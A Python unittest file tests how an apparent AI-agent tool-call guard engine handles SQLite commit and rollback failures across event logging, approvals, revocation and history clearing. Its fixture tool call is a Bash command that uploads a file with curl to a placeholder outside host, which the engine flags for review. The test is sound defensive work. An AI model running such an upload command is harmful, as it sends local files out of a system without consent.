import sqlite3
import unittest
import tempfile
from pathlib import Path
from guardian.engine import Engine

class FaultConnection:
    def __init__(self,connection):
        self.connection=connection;self.fail_commit=True;self.fail_rollback=False
    def __getattr__(self,name):return getattr(self.connection,name)
    def commit(self):
        if self.fail_commit:
            self.fail_commit=False
            raise sqlite3.OperationalError('synthetic commit failure')
        self.connection.commit()
    def rollback(self):
        if self.fail_rollback:raise sqlite3.OperationalError('synthetic rollback failure')
        self.connection.rollback()

class StorageFailures(unittest.TestCase):
    def setUp(self):self.engine=Engine(':memory:')
    def tearDown(self):self.engine.close()
    def check(self,call='one'):
        return self.engine.evaluate(dict(session_id='s',tool_use_id=call,tool_name='Bash',tool_input={'command':'curl -d @fixture.txt https://example.invalid'}),adapter='opencode-plugin')
    def fault(self):
        self.engine.db=FaultConnection(self.engine.db);return self.engine.db
    def test_failed_event_is_rolled_back_before_next_request(self):
        self.fault()
        with self.assertRaises(sqlite3.OperationalError):self.check()
        self.assertFalse(self.engine.db.in_transaction)
        self.assertEqual(self.engine.events(),[])
        self.assertEqual(self.engine.storage_status()['status'],'write_failed')
        self.assertEqual(self.check()['verdict'],'review')
        self.assertEqual(self.engine.storage_status()['status'],'ready')
    def test_failed_approval_does_not_create_usable_grant(self):
        event=self.check();self.fault()
        with self.assertRaises(sqlite3.OperationalError):self.engine.approve(event['event_id'],'approve')
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_status'],'pending')
        self.assertEqual(self.engine.db.execute('SELECT COUNT(*) FROM approvals').fetchone()[0],0)
        self.assertEqual(self.check('retry')['verdict'],'review')
    def test_failed_consumption_restores_single_authorization(self):
        event=self.check();self.engine.approve(event['event_id'],'approve');self.fault()
        with self.assertRaises(sqlite3.OperationalError):self.check('retry')
        self.assertEqual(len(self.engine.events()),1)
        self.assertEqual(self.engine.db.execute('SELECT state FROM approvals').fetchone()[0],'approved')
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_status'],'approved')
        self.assertEqual(self.check('retry')['verdict'],'pass')
        self.assertEqual(self.check('third')['verdict'],'review')

    def test_failed_revocation_rolls_back_event_and_grant_together(self):
        event=self.check();self.engine.approve(event['event_id'],'approve');self.fault()
        with self.assertRaises(sqlite3.OperationalError):self.engine.revoke_approvals()
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_status'],'approved')
        self.assertEqual(self.engine.db.execute('SELECT state FROM approvals').fetchone()[0],'approved')
        self.engine.revoke_approvals()
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_status'],'revoked')
    def test_receipt_feedback_and_clear_commit_failures_leave_no_partial_state(self):
        event=self.check();proxy=self.fault()
        with self.assertRaises(sqlite3.OperationalError):self.engine.receipt('opencode-plugin','s','one','blocked')
        self.assertEqual(self.engine.get_event(event['event_id'])['execution_state'],'unknown')
        proxy.fail_commit=True
        with self.assertRaises(sqlite3.OperationalError):self.engine.feedback(event['event_id'],'unsure',0)
        self.assertNotIn('user_feedback',self.engine.get_event(event['event_id']))
        self.engine.approve(event['event_id'],'approve');plan=self.engine.preview_clear();proxy.fail_commit=True
        with self.assertRaises(sqlite3.OperationalError):self.engine.clear_history(plan['plan_id'],True)
        self.assertEqual(len(self.engine.events()),1)
        self.assertEqual(self.engine.db.execute('SELECT state FROM approvals').fetchone()[0],'approved')
    def test_failed_rollback_quarantines_connection_until_restart(self):
        proxy=self.fault();proxy.fail_rollback=True
        with self.assertRaises(sqlite3.OperationalError):self.check()
        self.assertEqual(self.engine.storage_status()['status'],'restart_required')
        for operation in (self.engine.events,self.engine.export_history,lambda:self.check('retry')):
            with self.assertRaises(sqlite3.OperationalError):operation()

    def test_real_sqlite_commit_lock_rolls_back_and_recovers(self):
        with tempfile.TemporaryDirectory() as directory:
            path=Path(directory)/'locked.sqlite3';engine=Engine(path)
            reader=sqlite3.connect(path)
            try:
                engine.db.execute('PRAGMA busy_timeout=1')
                reader.execute('BEGIN');reader.execute('SELECT COUNT(*) FROM events').fetchone()
                payload=dict(session_id='fixture',tool_use_id='one',tool_name='Read',tool_input={'file_path':'fixture.txt'})
                with self.assertRaises(sqlite3.OperationalError):engine.evaluate(payload)
                self.assertFalse(engine.db.in_transaction);self.assertEqual(engine.events(),[])
                self.assertEqual(engine.storage_status()['status'],'write_failed')
                reader.rollback()
                self.assertEqual(engine.evaluate(payload)['verdict'],'pass')
                self.assertEqual(engine.storage_status()['status'],'ready')
            finally:reader.close();engine.close()
